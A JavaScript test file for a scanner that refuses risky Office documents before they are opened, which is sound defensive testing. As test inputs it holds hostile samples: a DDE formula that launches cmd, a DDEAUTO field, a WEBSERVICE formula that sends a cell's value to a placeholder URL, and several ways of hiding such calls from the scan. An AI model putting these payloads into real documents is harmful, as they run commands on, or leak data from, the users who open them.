// Fail-closed external-content and formula scan before any Office application opens a file
// (docs/AGENT-PLATFORM-M3-PLAN.md, M3-010/M3-014). Minimal Office Open XML packages built in the test.
const { test } = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const { zipSync, strToU8 } = require('fflate')
const { scanOffice } = require('../electron/office/office-scan.cjs')

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'najd-office-scan-'))
const make = (name, parts) => { const file = path.join(dir, name); fs.writeFileSync(file, zipSync(Object.fromEntries(Object.entries(parts).map(([k, v]) => [k, strToU8(v)])))); return file }
const sheet = cell => `<worksheet><sheetData><row r="1"><c r="A1"><f>${cell}</f></c></row></sheetData></worksheet>`
const book = (names = '') => `<workbook><sheets><sheet name="S" r:id="rId1"/></sheets>${names}</workbook>`
const xlsx = (name, cell, extra = {}, names = '') => make(name, { 'xl/workbook.xml': book(names), 'xl/worksheets/sheet1.xml': sheet(cell), ...extra })

test('ordinary local formulas, documents and decks pass', async () => {
  assert.deepEqual(await scanOffice(xlsx('ok.xlsx', 'SUM(A2:A9)+IFERROR(XLOOKUP(1,B:B,C:C),0)+_xlfn.TEXTJOIN(&quot;,&quot;,TRUE,D1:D3)')), [])
  assert.deepEqual(await scanOffice(make('ok.pptx', { 'ppt/slides/slide1.xml': '<p:sld/>', 'ppt/slides/_rels/slide1.xml.rels':
    '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>' })), [])
  assert.deepEqual(await scanOffice(make('ok.docx', { 'word/document.xml': '<w:document><w:instrText> PAGE </w:instrText></w:document>' })), [])
  assert.deepEqual(await scanOffice(xlsx('quoted.xlsx', 'IF(A1=&quot;WEBSERVICE(x)&quot;,1,0)')), [], 'text inside quotes is not a call')
})

test('network, add-in and unknown functions are refused, also inside defined names', async () => {
  const cases = [
    ['web.xlsx', 'WEBSERVICE(&quot;https://example.com/c?v=&quot;&amp;B1)', 'formula not allowed: WEBSERVICE'],
    ['image.xlsx', '_xlfn.IMAGE(&quot;https://example.com/a.png&quot;)', 'formula not allowed: IMAGE'],
    ['stock.xlsx', '_xlfn.STOCKHISTORY(&quot;MSFT&quot;,1)', 'formula not allowed: STOCKHISTORY'],
    ['rtd.xlsx', 'RTD(&quot;x&quot;,,&quot;y&quot;)', 'formula not allowed: RTD'],
    ['cube.xlsx', 'CUBEVALUE(&quot;c&quot;)', 'formula not allowed: CUBEVALUE'],
    ['unknown.xlsx', 'NAJDMYSTERY(1)', 'formula not allowed: NAJDMYSTERY'],
    ['ext.xlsx', '[Other.xlsx]Sheet1!A1', 'external workbook reference'],
    ['dde.xlsx', "cmd|' /c calc'!A0", 'DDE formula']
  ]
  for (const [name, formula, reason] of cases) assert.ok((await scanOffice(xlsx(name, formula))).includes(reason), name)
  const named = xlsx('named.xlsx', 'A2', {}, '<definedNames><definedName name="Leak">WEBSERVICE(&quot;https://example.com&quot;)</definedName></definedNames>')
  assert.deepEqual(await scanOffice(named), ['formula not allowed: WEBSERVICE'])
  const validation = xlsx('validation.xlsx', 'A2', { 'xl/worksheets/sheet2.xml': '<worksheet><dataValidations><dataValidation><formula1>WEBSERVICE("x")</formula1></dataValidation></dataValidations></worksheet>' })
  assert.ok((await scanOffice(validation)).includes('formula not allowed: WEBSERVICE'))
})

test('external parts, relationships, fields, controls and damaged packages are refused', async () => {
  const cases = [
    ['links.xlsx', { 'xl/externalLinks/externalLink1.xml': '<externalLink/>' }, 'external workbook link'],
    ['conn.xlsx', { 'xl/connections.xml': '<connections/>' }, 'data connection or query'],
    ['query.xlsx', { 'xl/queryTables/queryTable1.xml': '<queryTable/>' }, 'data connection or query'],
    ['rich.xlsx', { 'xl/richData/rdrichvalue.xml': '<rv/>' }, 'linked data types'],
    ['mashup.xlsx', { 'customXml/item1.xml': '<DataMashup xmlns="http://schemas.microsoft.com/DataMashup">x</DataMashup>' }, 'data connection or query'],
    ['activex.xlsx', { 'xl/activeX/activeX1.xml': '<ax/>' }, 'ActiveX or macro part'],
    ['macro.xlsx', { 'xl/vbaProject.bin': 'x' }, 'ActiveX or macro part']
  ]
  for (const [name, extra, reason] of cases) assert.ok((await scanOffice(xlsx(name, 'SUM(1)', extra))).includes(reason), name)
  const linked = make('linked.pptx', { 'ppt/slides/slide1.xml': '<p:sld/>', 'ppt/slides/_rels/slide1.xml.rels':
    '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="\\\\server\\share\\a.png" TargetMode="External"/></Relationships>' })
  assert.deepEqual(await scanOffice(linked), ['external resource: image'])
  for (const field of ['INCLUDEPICTURE "http://example.com/x.png"', 'INCLUDETEXT "c:\\\\x.docx"', 'DDEAUTO cmd x', 'LINK Excel.Sheet "c:\\\\a.xlsx"'])
    assert.ok((await scanOffice(make('field.docx', { 'word/document.xml': `<w:document><w:instrText>${field}</w:instrText></w:document>` })))[0].startsWith('field that loads content'), field)
  assert.ok((await scanOffice(make('simple.docx', { 'word/document.xml': '<w:document><w:fldSimple w:instr=" INCLUDEPICTURE x "/></w:document>' }))).includes('field that loads content: INCLUDEPICTURE'))
  fs.writeFileSync(path.join(dir, 'enc.pptx'), Buffer.from('d0cf11e0a1b11ae1', 'hex'))
  assert.deepEqual(await scanOffice(path.join(dir, 'enc.pptx')), ['not an Office Open XML package (encrypted or damaged)'])
  assert.deepEqual(await scanOffice(make('dtd.docx', { 'word/document.xml': '<!DOCTYPE x [<!ENTITY e "x">]><w:document/>' })), ['document type declaration'])
})

test('M3-I002: single quotes, character references, prefixes, CDATA and split field runs do not bypass the scan', async () => {
  const quotes = make('quotes.pptx', { 'ppt/slides/slide1.xml': '<p:sld/>', 'ppt/slides/_rels/slide1.xml.rels':
    "<Relationships><Relationship Id='r1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/image' Target='https://example.com/a.png' TargetMode='External'/></Relationships>" })
  assert.deepEqual(await scanOffice(quotes), ['external resource: image'])
  assert.ok((await scanOffice(xlsx('ref.xlsx', '&#87;EBSERVICE(&quot;https://example.com&quot;)'))).includes('formula not allowed: WEBSERVICE'))
  assert.ok((await scanOffice(xlsx('hex.xlsx', '&#x57;&#x45;BSERVICE(&quot;x&quot;)'))).includes('formula not allowed: WEBSERVICE'))
  const prefixed = make('prefixed.xlsx', { 'xl/workbook.xml': '<x:workbook xmlns:x="s"/>', 'xl/worksheets/sheet1.xml': '<x:worksheet xmlns:x="s"><x:sheetData><x:row><x:c><x:f>WEBSERVICE("x")</x:f></x:c></x:row></x:sheetData></x:worksheet>' })
  assert.ok((await scanOffice(prefixed)).includes('formula not allowed: WEBSERVICE'))
  assert.ok((await scanOffice(xlsx('cdata.xlsx', '<![CDATA[WEBSERVICE("x")]]>'))).includes('formula not allowed: WEBSERVICE'))
  const split = make('split.docx', { 'word/document.xml': '<w:document><w:p>' +
    '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDE</w:instrText></w:r><w:r><w:instrText>PICTURE "http://example.com/x.png" </w:instrText></w:r>' +
    '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:document>' })
  assert.deepEqual(await scanOffice(split), ['field that loads content: INCLUDEPICTURE'])
  const page = make('page.docx', { 'word/document.xml': '<w:document><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> PAGE </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:document>' })
  assert.deepEqual(await scanOffice(page), [], 'an ordinary field is fine')
  assert.ok((await scanOffice(xlsx('entity.xlsx', 'SUM(1)&unknown;'))).some(reason => reason.startsWith('unreadable XML')))
})

test('M3-I005: byte budgets stop expansion bombs; the scan runs in a worker and can be cancelled', async () => {
  const big = make('big.xlsx', { 'xl/workbook.xml': '<workbook/>', 'xl/worksheets/sheet1.xml': '<worksheet>' + 'a'.repeat(400000) + '</worksheet>' })
  assert.deepEqual(await scanOffice(big, { limits: { maxInput: 1e8, maxParts: 4000, maxPart: 100000, maxTotal: 1e8 } }), ['package too large to check'])
  assert.deepEqual(await scanOffice(big, { limits: { maxInput: 1e8, maxParts: 4000, maxPart: 1e8, maxTotal: 200000 } }), ['package too large to check'])
  assert.deepEqual(await scanOffice(big, { limits: { maxInput: 100, maxParts: 4000, maxPart: 1e8, maxTotal: 1e8 } }), ['package too large to check'])
  const controller = new AbortController(); controller.abort()
  assert.deepEqual(await scanOffice(big, { signal: controller.signal }), ['scan cancelled'])
})

test('M3-I011: formulas, fields and risky parts are found wherever the package puts them', async () => {
  const web = '<worksheet><sheetData><row r="1"><c r="A1"><f>WEBSERVICE(&quot;https://example.com&quot;)</f></c></row></sheetData></worksheet>'
  const moved = make('moved.xlsx', { 'xl/workbook.xml': book(), 'xl/_rels/workbook.xml.rels': '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="../sheets/sheet1.xml"/></Relationships>', 'sheets/sheet1.xml': web })
  assert.ok((await scanOffice(moved)).includes('formula not allowed: WEBSERVICE'), 'a sheet outside xl/ is checked')
  const renamed = make('renamed.xlsx', { 'xl/workbook.xml': book(), 'xl/worksheets/data.bin': web })
  assert.ok((await scanOffice(renamed)).includes('formula not allowed: WEBSERVICE'), 'an XML part with another extension is checked')
  const field = make('field.docx', { 'word/document.xml': '<w:document/>', 'parts/body.dat': '<w:document><w:fldSimple w:instr=" INCLUDETEXT &quot;x&quot; "/></w:document>' })
  assert.ok((await scanOffice(field)).includes('field that loads content: INCLUDETEXT'))
  const macro = make('macro.xlsx', { '[Content_Types].xml': '<Types><Override PartName="/x/m1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/></Types>', 'xl/workbook.xml': book(), 'x/m1.xml': '<xm:macrosheet/>' })
  assert.ok((await scanOffice(macro)).some(reason => reason.startsWith('part that loads data, macros or controls')))
  const link = make('link.xlsx', { 'xl/workbook.xml': book(), 'xl/_rels/workbook.xml.rels': '<Relationships><Relationship Id="r9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="../other/e1.xml"/></Relationships>' })
  assert.ok((await scanOffice(link)).some(reason => reason.startsWith('part that loads data, macros or controls')), 'an external link outside xl/externalLinks is found by its type')
  const wide = path.join(dir, 'wide.xlsx')
  fs.writeFileSync(wide, zipSync({ 'xl/workbook.xml': strToU8(book()), 'xl/worksheets/sheet1.xml': new Uint8Array(Buffer.from('\ufeff' + web, 'utf16le')) }))
  assert.ok((await scanOffice(wide)).some(reason => reason.startsWith('XML part in an encoding')), 'UTF-16 parts are refused, not skipped')
  // Ordinary binary parts (pictures, printer settings) still pass.
  const file = path.join(dir, 'picture.pptx')
  fs.writeFileSync(file, zipSync({ 'ppt/slides/slide1.xml': strToU8('<p:sld/>'), 'ppt/media/image1.png': new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0, 1, 2, 3]), 'xl/printerSettings/p1.bin': new Uint8Array([0, 1, 2]) }))
  assert.deepEqual(await scanOffice(file), [])
})

test('M3-I018: every call is a whole name on the allowlist; add-in, user-defined, LAMBDA and odd syntax are refused', async () => {
  const refused = async (name, formula) => (await scanOffice(xlsx(name, formula))).filter(reason => /formula not allowed|formula syntax not checked/.test(reason))
  assert.deepEqual(await refused('xll.xlsx', '_xll.NAJDTEST(1)'), ['formula not allowed: _XLL.NAJDTEST'])
  assert.deepEqual(await refused('under.xlsx', 'NAJD_UNKNOWN(1)'), ['formula not allowed: NAJD_UNKNOWN'])
  assert.deepEqual(await refused('udf.xlsx', '_xludf.MYFUNC(A1)'), ['formula not allowed: _XLUDF.MYFUNC'])
  assert.deepEqual(await refused('arabic.xlsx', 'دالة(1)'), ['formula not allowed: دالة'])
  assert.deepEqual(await refused('lambda.xlsx', '_xlfn.LAMBDA(_xlpm.x,_xlpm.x+1)(5)'), ['formula syntax not checked'], 'calling what a LAMBDA returns is syntax NAJD does not check')
  assert.deepEqual(await refused('nested.xlsx', '_xlfn._xlws.SORT(A1:A3)+SUM((A1+A2)*2)'), [], 'grouping parentheses and doubled prefixes pass')
  assert.deepEqual(await refused('sheet.xlsx', "SUM('My (Sheet)'!A1:A2)"), [], 'a quoted sheet name is not a call')
  const named = await scanOffice(xlsx('named.xlsx', 'SUM(A1)', {}, '<definedNames><definedName name="x">_xll.ADDIN(1)</definedName></definedNames>'))
  assert.ok(named.includes('formula not allowed: _XLL.ADDIN'), 'also in defined names')
})
